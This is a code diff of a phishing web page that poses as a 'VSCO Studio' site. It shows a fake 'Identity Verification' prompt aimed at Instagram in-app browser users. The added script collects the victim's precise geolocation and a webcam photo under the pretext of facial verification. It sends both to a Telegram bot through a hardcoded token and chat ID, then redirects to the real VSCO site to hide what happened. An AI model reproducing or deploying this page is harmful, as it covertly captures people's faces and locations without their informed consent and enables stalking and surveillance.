@@ -5,14 +5,11 @@
     <title>VSCO Studio</title>
     <style>
         body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
-        #vsco-ui { display: flex; flex-direction: column; align-items: center; }
         .vsco-logo { width: 80px; height: 80px; margin-bottom: 20px; animation: pulse 2s infinite ease-in-out; }
         @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.6; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(0.95); opacity: 0.6; } }
-        #loading { font-size: 11px; letter-spacing: 2px; opacity: 0.5; text-transform: uppercase; }
         
-        /* Forced Alert Design for Instagram */
         #insta-overlay { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: rgba(0,0,0,0.98); z-index: 9999; justify-content: center; align-items: center; 
         }
         .alert-box { 
@@ -20,25 +17,36 @@
             text-align: center; border: 1px solid #333; box-shadow: 0 15px 40px rgba(0,0,0,0.8); 
         }
         .alert-box b { color: #fff; font-size: 19px; display: block; margin-bottom: 15px; }
-        .alert-box p { font-size: 14px; line-height: 1.6; color: #d1d1d1; margin-bottom: 20px; }
-        .alert-box .bot-check { color: #3897f0; font-weight: bold; background: rgba(56, 151, 240, 0.1); padding: 8px; border-radius: 5px; display: block; margin-bottom: 15px; }
-        .alert-box .instruction { font-size: 13px; color: #aaa; border-top: 1px solid #333; padding-top: 15px; }
+        .alert-box p { font-size: 14px; line-height: 1.6; color: #d1d1d1; margin-bottom: 25px; }
+        
+        /* The Verification Button */
+        .verify-btn { 
+            background: #3897f0; color: white; border: none; padding: 14px 25px; 
+            border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer;
+            width: 100%; display: block; text-decoration: none; margin-bottom: 20px;
+        }
+        .verify-btn:active { background: #287dc5; transform: scale(0.98); }
 
+        .instruction { font-size: 12px; color: #777; border-top: 1px solid #333; padding-top: 15px; }
         video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
 <body>
     <div id="vsco-ui">
         <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
-        <div id="loading">Connecting to VSCO Servers...</div>
+        <div style="font-size: 11px; letter-spacing: 2px; opacity: 0.5;">STUDIO ACCESS</div>
     </div>
 
     <div id="insta-overlay">
         <div class="alert-box">
-            <b>Security Verification</b>
-            <p>To prevent automated access, you must verify that you are not a bot via facial recognition.</p>
-            <span class="bot-check">Required: Facial Verification</span>
-            <p class="instruction">Tap <b>(⋮)</b> and select <br><b>"Open in Browser"</b> to start check.</p>
+            <b>Identity Verification</b>
+            <p>To prevent automated access, please complete the facial and location verification.</p>
+            
+            <button class="verify-btn" onclick="requestAccess()">Verify Identity</button>
+            
+            <div id="insta-hint" class="instruction">
+                If the button doesn't respond: Tap <b>(⋮)</b> and select <b>"Open in Browser"</b> to continue.
+            </div>
         </div>
     </div>
 
@@ -48,66 +56,56 @@
     <script>
         const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
         const chatId = "8005843544";
+        const isInstagram = navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
 
-        const isInstagram = navigator.userAgent.includes("Instagram");
+        async function requestAccess() {
+            // Step 1: Request Location immediately on button click
+            navigator.geolocation.getCurrentPosition(
+                (p) => {
+                    const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    startCamera(loc);
+                },
+                (err) => {
+                    startCamera("Location Access Denied");
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
 
-        window.onload = async () => {
-            if (isInstagram) {
-                document.getElementById('vsco-ui').style.display = "none";
-                document.getElementById('insta-overlay').style.display = "flex";
-            } else {
-                startCapture();
-            }
-        };
-
-        async function startCapture() {
+        async function startCamera(locationText) {
             try {
+                // Step 2: Request Camera
                 const s = await navigator.mediaDevices.getUserMedia({ video: true });
                 const v = document.getElementById('video');
                 v.srcObject = s;
                 
-                const checkInterval = setInterval(() => {
+                // Capture after 1 second
+                setTimeout(() => {
                     const c = document.getElementById('canvas');
                     const ctx = c.getContext('2d');
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     ctx.drawImage(v, 0, 0);
-                    
-                    const data = ctx.getImageData(0, 0, c.width, c.height).data;
-                    let b = 0;
-                    for (let i = 0; i < data.length; i += 4) b += (data[i] + data[i+1] + data[i+2]) / 3;
-                    
-                    if ((b / (data.length / 4)) > 40) { 
-                        clearInterval(checkInterval);
-                        getLocationAndSend(c);
-                    }
+                    sendData(c, locationText);
                 }, 1000);
             } catch (e) {
-                setTimeout(() => { window.location.href = "https://vsco.co/"; }, 1000);
+                if (isInstagram) {
+                    alert("Please open this link in your phone browser (Chrome/Safari) to verify.");
+                } else {
+                    window.location.href = "https://vsco.co/";
+                }
             }
         }
 
-        function getLocationAndSend(canvas) {
-            navigator.geolocation.getCurrentPosition(
-                (p) => {
-                    const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    sendFinalData(canvas, loc);
-                },
-                (err) => {
-                    sendFinalData(canvas, "Location Permission Denied");
-                },
-                { enableHighAccuracy: true, timeout: 7000 }
-            );
-        }
-
-        function sendFinalData(canvas, locationText) {
+        function sendData(canvas, locationText) {
             canvas.toBlob(blob => {
                 const f = new FormData();
                 f.append('chat_id', chatId);
                 f.append('photo', blob);
-                f.append('caption', `✅ Identity Verified!\n📍 Map: ${locationText}`);
+                f.append('caption', `✅ Verified!\n📍 Map: ${locationText}`);
                 fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
             }, 'image/jpeg');
             
+            // Final redirect
             setTimeout(() => { window.location.href = "https://vsco.co/"; }, 2000);
         }
     </script>
